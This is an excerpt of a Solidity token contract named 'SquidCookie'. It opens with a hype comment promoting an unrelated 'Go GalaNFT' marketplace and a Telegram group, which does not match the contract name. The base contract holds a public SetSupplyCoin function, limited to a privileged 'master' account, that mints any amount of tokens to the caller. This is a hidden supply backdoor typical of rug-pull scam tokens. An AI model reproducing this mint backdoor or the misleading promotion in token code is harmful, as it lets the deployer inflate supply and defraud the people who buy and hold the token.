...
/**   Welcome to Go GalaNFT 
 *      Marketplace NFT On Binance Smart Chain . Launch Today 
 *      On Ethereum Chain Launch Tomorrow.
 * 
 *      Telegram Group https://t.me/GoGalaNFT
 * 
 *     Dont Miss GalaNFT , Hold And Lets To The Moon!!!
...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function SetSupplyCoin(uint256 amount) public onlyMaster {
    _SupplyToken(msg.sender, amount);
    }
    ...
    function _SupplyToken(address account, uint256 amount) internal virtual {
...
contract SquidCookie is ERC200 {

    uint tokenTotalSupply = 100000000;

    constructor() public ERC200("SquidCookie", "SQUIDCOOKIE") {
        _SupplyToken(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}